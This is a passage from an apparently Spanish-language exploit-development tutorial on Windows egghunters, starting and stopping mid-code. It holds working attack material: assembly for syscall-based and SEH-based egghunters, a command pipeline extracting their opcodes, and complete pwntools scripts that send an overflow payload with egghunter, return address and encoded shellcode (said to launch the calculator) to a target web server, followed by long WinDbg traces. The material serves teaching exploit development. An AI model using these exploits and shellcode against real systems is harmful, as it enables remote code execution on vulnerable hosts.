        </span><span class="o">call </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">]       </span><span class="c1">; syscall
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0xc        </span><span class="c1">; clear stack

        </span><span class="o">pop </span><span class="mi">edx             </span><span class="c1">; restore edx
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x8        </span><span class="c1">; clear stack

        </span><span class="o">cmp </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x5         </span><span class="c1">; check ACCESS_VIOLATION (0xc0000005)  
        </span><span class="o">jz .</span><span class="na">page            </span><span class="c1">; if zf == 1 -> next page

        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077 </span><span class="c1">; $eax = "w00t"
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">edx        </span><span class="c1">; $edi = address

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">jmp </span><span class="mi">edi             </span><span class="c1">; if zf == 1 -> exec</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf egghunter.asm -o egghunter.o
</span><span class="ve">❯ ld </span><span class="p">egghunter.o -m elf_i386 -o egghunter

</span><span class="ve">❯ objdump </span><span class="p">-d egghunter | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:'</span><span class="p"> | </span><span class="ve">grep </span><span class="p">-v</span><span class="am"> 'egghunter' </span><span class="p">| </span><span class="ve">cut </span><span class="p">-f2 -d: | </span><span class="ve">cut </span><span class="p">-f1-6 -d</span><span class="am"> ' ' </span><span class="p">| </span><span class="ve">tr </span><span class="p">-s</span><span class="am"> ' ' </span><span class="p">| </span><span class="ve">tr </span><span class="am">'\t' ' ' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d</span><span class="am"> ''</span><span class="p"> -s
\x31\xd2\x66\x81\xca\xff\x0f\x42\x31\xdb\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7  </span>
</code></pre></div></div><br>

<p class="plain-text">Al exploit anterior solo le cambiamos el <code class="language-plaintext highlighter-rouge">egghunter</code> por el que acabamos de crear y ahora al ejecutarlo en un sistema <code class="language-plaintext highlighter-rouge">x64</code> funciona correctamente y lanza la calculadora</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
egghunter </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x31\xd2\x66\x81\xca\xff\x0f\x42\x31\xdb\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7</span><span class="s">"  

</span><span class="p">shellcode </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xfc\xbb\xc2\x02\xd8\xe2\xeb\x0c\x5e\x56\x31</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xff\xff\xff\x3e\xea\x5a\xe2\xbe\xeb\x3a\x6a</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5b\xda\x7a\x08\x28\x4d\x4b\x5a\x7c\x62\x20</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0e\x94\xf1\x44\x87\x9b\xb2\xe3\xf1\x92\x43</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x5f\xc1\xb5\xc7\xa2\x16\x15\xf9\x6c\x6b\x54</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x3e\x90\x86\x04\x97\xde\x35\xb8\x9c\xab\x85</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x33\xee\x3a\x8e\xa0\xa7\x3d\xbf\x77\xb3\x67</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x1f\x76\x10\x1c\x16\x60\x75\x19\xe0\x1b\x4d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd5\xf3\xcd\x9f\x16\x5f\x30\x10\xe5\xa1\x75</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x97\x16\xd4\x8f\xeb\xab\xef\x54\x91\x77\x65</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x4e\x31\xf3\xdd\xaa\xc3\xd0\xb8\x39\xcf\x9d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcf\x65\xcc\x20\x03\x1e\xe8\xa9\xa2\xf0\x78</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe9\x80\xd4\x21\xa9\xa9\x4d\x8c\x1c\xd5\x8d</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6f\xc0\x73\xc6\x82\x15\x0e\x85\xc8\xe8\x9c</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xb0\xbf\xeb\x9e\xba\xef\x83\xaf\x31\x60\xd3</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x90\xc4\x2b\x7a\xb8\x6d\xa4\x23\x29\x2c</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa9\xd3\x84\x73\xd4\x57\x2c\x0c\x23\x47\x45</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\x09\x6f\xcf\xb6\x63\xe0\xba\xb8\xd0\x01\xef</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xdb\xb7\x91\x73\x35\x5d\x12\x11\x49\x9d\xe2</span><span class="s">"</span><span class="p">
shellcode</span><span class="o"> += </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd9\x49\x9d\xe2\xd9</span><span class="s">"</span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">=</span><span class="no"> b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">ret

method </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">
content </span><span class="o">+= </span><span class="p">egg</span><span class="o"> + </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<a href="/exploitdevelopment/user-mode/egghunters/4.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/4.png"></p></div></a>

</section>

<section class="post" id="seh">
<br><h3 class="post-title">6.8 - EggHunter SEH</h3><br>

<p class="plain-text">Hasta ahora logramos modificar el egghunter para que funcione en la versión actual de <code class="language-plaintext highlighter-rouge">Windows 10</code> y en un sistema de <code class="language-plaintext highlighter-rouge">64 bits</code>, sin embargo para saber cual usar necesitariamos saber que version usa el sistema victima, esto generalmente es parte del proceso de reconocimiento pero nuestra idea es tener un exploit que funcione en casi cualquier sistema donde se ejecute sin la necesidad de ser modificado</p>
<p class="plain-text">En exploits anteriores dependiamos de una <code class="language-plaintext highlighter-rouge">syscall</code> para llamar a una funcion que comprobara si la dirección de memoria era valida, sin embargo podemos utilizar el propio sistema <code class="language-plaintext highlighter-rouge">SEH</code> antes visto para hacer esta comprobacion controlando las excepciones que ocurren cuando la dirección no es válida, el equipo de <a href="https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/">corelan</a> hizo un gran trabajo con el siguiente egghunter sin embargo al probarlo en un sistema actual como Windows 10 simplemente falla en algun punto y no se ejecuta</p>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start</span><span class="p">:

</span><span class="na">_start</span><span class="p">:
    </span><span class="o">jmp .</span><span class="na">addr                      </span><span class="c1">; jmp to call .seh

    </span><span class="o">.</span><span class="na">seh</span><span class="p">:
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077        </span><span class="c1">; $eax = "w00t"

        </span><span class="o">pop </span><span class="mi">ecx                    </span><span class="c1">; $ecx = handler
        </span><span class="o">push </span><span class="mi">ecx                   </span><span class="c1">; push handler
        </span><span class="o">push </span><span class="mi">0xffffffff            </span><span class="c1">; push nseh

        </span><span class="o">xor </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">ebx               </span><span class="c1">; $ebx = 0x0
        </span><span class="o">mov </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">], </span><span class="mi">esp          </span><span class="c1">; overwrite ExceptionList in TEB  

    </span><span class="o">.</span><span class="na">find</span><span class="p">:
        </span><span class="o">push </span><span class="mi">0x2                   </span><span class="c1">; push 0x2
        </span><span class="o">pop </span><span class="mi">ecx                    </span><span class="c1">; $ecx = counter

        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">ebx               </span><span class="c1">; $edi = address
        </span><span class="o">repz scasd                 </span><span class="c1">; cmp eax, [edi]

        </span><span class="o">jnz .</span><span class="na">loop                  </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">jmp </span><span class="mi">edi                    </span><span class="c1">; if zf == 1 -> exec

    </span><span class="o">.</span><span class="na">page</span><span class="p">:
        </span><span class="o">or </span><span class="mi">bx</span><span class="p">, </span><span class="mi">0xfff               </span><span class="c1">; get last address in page

    </span><span class="o">.</span><span class="na">loop</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">ebx                    </span><span class="c1">; increase memory counter
        </span><span class="o">jmp .</span><span class="na">find                  </span><span class="c1">; loop to cmp

    </span><span class="o">.</span><span class="na">addr</span><span class="p">:
        </span><span class="o">call .</span><span class="na">seh                  </span><span class="c1">; call .seh to set handler

        </span><span class="o">push </span><span class="mi">0xc                   </span><span class="c1">; push 0xc
        </span><span class="o">pop </span><span class="mi">ecx                    </span><span class="c1">; $ecx = 0xc
        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, [</span><span class="mi">esp </span><span class="o">+ </span><span class="mi">ecx</span><span class="p">]       </span><span class="c1">; $eax = structure for exception  

        </span><span class="o">mov </span><span class="mi">cl</span><span class="p">, </span><span class="mi">0xb8               </span><span class="c1">; $ecx = offset to eip
        </span><span class="o">add </span><span class="no">dword </span><span class="p">[</span><span class="mi">eax </span><span class="o">+ </span><span class="mi">ecx</span><span class="p">], </span><span class="mi">0x6 </span><span class="c1">; add 0x6 to eip = .page

        </span><span class="o">pop </span><span class="mi">eax                    </span><span class="c1">; $eax = return value
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x10              </span><span class="c1">; clear stack
        </span><span class="o">push </span><span class="mi">eax                   </span><span class="c1">; push return value

        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax               </span><span class="c1">; $eax = 0x0
        </span><span class="o">ret                        </span><span class="c1">; return to .page</span>
</code></pre></div></div><br>

<p class="plain-text">Cuando ocurre una excepción el sistema llama a <a href="https://learn.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-170#language-specific-handler">_except_handler</a> que recibe varios parámetros, el parametro <code class="language-plaintext highlighter-rouge">ContextRecord</code> es uno de los que nos pueden interesar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">typedef </span><span class="na">EXCEPTION_DISPOSITION </span><span class="p">(</span><span class="o">*</span><span class="am">PEXCEPTION_ROUTINE</span><span class="p">) (  
    </span><span class="mi">IN </span><span class="p">PEXCEPTION_RECORD ExceptionRecord,
    </span><span class="mi">IN </span><span class="no">ULONG64 </span><span class="p">EstablisherFrame,
    </span><span class="mi">IN </span><span class="no">OUT </span><span class="p">PCONTEXT ContextRecord,
    </span><span class="mi">IN </span><span class="no">OUT </span><span class="p">PDISPATCHER_CONTEXT DispatcherContext
);</span>
</code></pre></div></div><br>

<p class="plain-text">El parámetro <code class="language-plaintext highlighter-rouge">ContextRecord</code> apunta a una estructura <code class="language-plaintext highlighter-rouge">CONTEXT</code>, esta estructura guarda los datos de los registros en el momento en que ocurrió la excepción</p>
<p class="plain-text">Con un offset de <code class="language-plaintext highlighter-rouge">0xb8</code> encontramos el valor de <code class="language-plaintext highlighter-rouge">Eip</code> que apunta a la dirección de la instrucción que ha ocasionado la excepción, nuestra idea sera modificar esta estructura para llevar el flujo hacia el segmento <code class="language-plaintext highlighter-rouge">.page</code> que aumentara la página</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_CONTEXT
   +0x000 ContextFlags      : Uint4B
   +0x004 Dr0               : Uint4B
   +0x008 Dr1               : Uint4B
   +0x00c Dr2               : Uint4B
   +0x010 Dr3               : Uint4B
   +0x014 Dr6               : Uint4B
   +0x018 Dr7               : Uint4B
   +0x01c FloatSave         : _FLOATING_SAVE_AREA  
   +0x08c SegGs             : Uint4B
   +0x090 SegFs             : Uint4B
   +0x094 SegEs             : Uint4B
   +0x098 SegDs             : Uint4B
   +0x09c Edi               : Uint4B
   +0x0a0 Esi               : Uint4B
   +0x0a4 Ebx               : Uint4B
   +0x0a8 Edx               : Uint4B
   +0x0ac Ecx               : Uint4B
   +0x0b0 Eax               : Uint4B
   +0x0b4 Ebp               : Uint4B
   +0x0b8 Eip               : Uint4B
   +0x0bc SegCs             : Uint4B
   +0x0c0 EFlags            : Uint4B
   +0x0c4 Esp               : Uint4B
   +0x0c8 SegSs             : Uint4B
   +0x0cc ExtendedRegisters : [512] UChar</span>
</code></pre></div></div><br>

<p class="plain-text">Luego de ello solo necesitamos modificar el valor de retorno desde el registro <code class="language-plaintext highlighter-rouge">eax</code>, esto a través de la estructura <code class="language-plaintext highlighter-rouge">_EXCEPTION_DISPOSITION</code> que contiene 4 posibles valores de retorno, cada uno de estos valores indican como se ha manejado la excepción, para indicar que la excepción se ha manejado con exito tendriamos que usar <code class="language-plaintext highlighter-rouge">ExceptionContinueExecution</code> o representado con su valor hexadecimal <code class="language-plaintext highlighter-rouge">0x00</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dt ntdll!_EXCEPTION_DISPOSITION  
   ExceptionContinueExecution = 0n0
   ExceptionContinueSearch = 0n1
   ExceptionNestedException = 0n2
   ExceptionCollidedUnwind = 0n3</span>
</code></pre></div></div><br>

<p class="plain-text">Ya que el egghunter falla igual que antes al inicio del codigo agregaremos un <code class="language-plaintext highlighter-rouge">int3</code> que a la hora de compilar el valor de este opcode se representará solo como un <code class="language-plaintext highlighter-rouge">\xcc</code> al inicio, este nos servirá como <code class="language-plaintext highlighter-rouge">breakpoint</code> donde se detendrá el debugger</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start</span><span class="p">:

</span><span class="na">_start</span><span class="p">:
    </span><span class="o">int3
    </span><span class="o">jmp .</span><span class="na">addr                      </span><span class="c1">; jmp to call .seh  </span>
</code></pre></div></div><br>

<p class="plain-text">Nuevamente ejecutamos el exploit con el nuevo codigo que nos genero el egghunter</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
egghunter </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xcc\xeb\x21\xb8\x77\x30\x30\x74\x59\x51\x6a\xff\x31\xdb\x64\x89\x23\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3</span><span class="s">"  </span><span class="p">

shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">300</span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">ret

method  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm("jle $+0x17")

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">
content </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutarse se detiene en el breakpoint que ocasiona el <code class="language-plaintext highlighter-rouge">int3</code>, ahora mismo el registro <code class="language-plaintext highlighter-rouge">eip</code> apunta a nuestro nuevo egghunter que procederemos a debuggear</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1680.12f8): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=019029d0 ecx=0000000e edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367ea9d esp=0367ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367ea9d cc              int     3

</span><span class="ro">0:000> </span><span class="p">u eip L1c
0367ea9d cc              int     3
0367ea9e eb21            jmp     0367eac1
0367eaa0 b877303074      mov     eax,74303077h
0367eaa5 59              pop     ecx
0367eaa6 51              push    ecx
0367eaa7 6aff            push    0FFFFFFFFh
0367eaa9 31db            xor     ebx,ebx
0367eaab 648923          mov     dword ptr fs:[ebx],esp
0367eaae 6a02            push    2
0367eab0 59              pop     ecx
0367eab1 89df            mov     edi,ebx
0367eab3 f3af            repe scas dword ptr es:[edi]
0367eab5 7507            jne     0367eabe
0367eab7 ffe7            jmp     edi
0367eab9 6681cbff0f      or      bx,0FFFh
0367eabe 43              inc     ebx
0367eabf ebed            jmp     0367eaae
0367eac1 e8daffffff      call    0367eaa0
0367eac6 6a0c            push    0Ch
0367eac8 59              pop     ecx
0367eac9 8b040c          mov     eax,dword ptr [esp+ecx]
0367eacc b1b8            mov     cl,0B8h
0367eace 83040806        add     dword ptr [eax+ecx],6
0367ead2 58              pop     eax
0367ead3 83c410          add     esp,10h
0367ead6 50              push    eax
0367ead7 31c0            xor     eax,eax
0367ead9 c3              ret</span>
</code></pre></div></div><br>

<p class="plain-text">El codigo egghunter inicia haciendo un salto a <code class="language-plaintext highlighter-rouge">.addr</code> que ejecuta un call a <code class="language-plaintext highlighter-rouge">.seh</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> p
eax=00000000 ebx=019029d0 ecx=0000000e edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367ea9e esp=0367ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367ea9e eb21            jmp     0367eac1

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=019029d0 ecx=0000000e edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367eac1 esp=0367ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eac1 e8daffffff      call    0367eaa0

</span><span class="ro">0:000> </span><span class="p">t
eax=00000000 ebx=019029d0 ecx=0000000e edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367eaa0 esp=0367ea30 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eaa0 b877303074      mov     eax,74303077h</span>
</code></pre></div></div><br>

<p class="plain-text">La importancia del <code class="language-plaintext highlighter-rouge">call</code> es que guarda la dirección de retorno en el stack, que es lo que esta despues del call, en este caso todo el código que controla la excepción</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">dds esp L1
0367ea30  0367eac6

</span><span class="ro">0:000> </span><span class="p">u poi(esp)
0367eac6 6a0c            push    0Ch
0367eac8 59              pop     ecx
0367eac9 8b040c          mov     eax,dword ptr [esp+ecx]  
0367eacc b1b8            mov     cl,0B8h
0367eace 83040806        add     dword ptr [eax+ecx],6
0367ead2 58              pop     eax
0367ead3 83c410          add     esp,10h
0367ead6 50              push    eax</span>
</code></pre></div></div><br>

<p class="plain-text">Guarda en el registro <code class="language-plaintext highlighter-rouge">ecx</code> el valor de la dirección del retorno de la llamada y la devuelve al stack, seguido de ello empuja al stack el valor <code class="language-plaintext highlighter-rouge">0xffffffff</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=019029d0 ecx=0000000e edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367eaa5 esp=0367ea30 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eaa5 59              pop     ecx

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=019029d0 ecx=0367eac6 edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367eaa6 esp=0367ea34 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eaa6 51              push    ecx

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=019029d0 ecx=0367eac6 edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367eaa7 esp=0367ea30 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eaa7 6aff            push    0FFFFFFFFh

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=019029d0 ecx=0367eac6 edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367eaa9 esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eaa9 31db            xor     ebx,ebx

</span><span class="ro">0:000> </span><span class="p">dds esp L2
0367ea2c  ffffffff
0367ea30  0367eac6</span>
</code></pre></div></div><br>

<p class="plain-text">Establece el valor de ebx en <code class="language-plaintext highlighter-rouge">0</code> y mueve a <code class="language-plaintext highlighter-rouge">fs:[ebx]</code> la dirección del <code class="language-plaintext highlighter-rouge">esp</code>, lo que quiere decir que en <code class="language-plaintext highlighter-rouge">fs:[0]</code> encontraremos el puntero a los ultimos 2 dwords</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=74303077 ebx=019029d0 ecx=0367eac6 edx=77d71670 esi=019029d0 edi=0041703c
eip=0367eaa9 esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0367eaa9 31db            xor     ebx,ebx

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=00000000 ecx=0367eac6 edx=77d71670 esi=019029d0 edi=0041703c
eip=0367eaab esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0367eaab 648923          mov     dword ptr fs:[ebx],esp fs:003b:00000000=0367ff70  

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=00000000 ecx=0367eac6 edx=77d71670 esi=019029d0 edi=0041703c
eip=0367eaae esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0367eaae 6a02            push    2

</span><span class="ro">0:000> </span><span class="p">dds poi(fs:[0]) L2
0367ea2c  ffffffff
0367ea30  0367eac6</span>
</code></pre></div></div><br>

<p class="plain-text">Como en <code class="language-plaintext highlighter-rouge">fs:[0]</code> se guarda el puntero se guarda el puntero a la estructura <code class="language-plaintext highlighter-rouge">SEH</code> entonces nuestro controlador apuntara a lo que esta después de la llamada y el siguiente SEH al ser <code class="language-plaintext highlighter-rouge">0xffffffff</code> indica que no existe y este será el unico controlador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!exchain
0367ea2c: 0367eac6
Invalid exception stack at ffffffff</span>
</code></pre></div></div><br>

<p class="plain-text">Después de modificar la estructura SEH a nuestro favor pasamos a la sección <code class="language-plaintext highlighter-rouge">.find</code>, parecido a lo que vimos antes en <code class="language-plaintext highlighter-rouge">eax</code> se guarda el valor de <code class="language-plaintext highlighter-rouge">w00t</code>, mueve a <code class="language-plaintext highlighter-rouge">edi</code> la dirección actual de memoria y ejecuta <code class="language-plaintext highlighter-rouge">scasd</code> con la diferencia que usa <code class="language-plaintext highlighter-rouge">repz</code> para si sale bien se ejecute de nuevo, como la página no es válida se ocaciona un error</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=74303077 ebx=00000000 ecx=0367eac6 edx=77d71670 esi=019029d0 edi=0041703c  
eip=0367eaae esp=0367ea2c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246  
0367eaae 6a02            push    2

</span><span class="ro">0:000> </span><span class="p">p
eax=74303077 ebx=00000000 ecx=0367eac6 edx=77d71670 esi=019029d0 edi=0041703c  
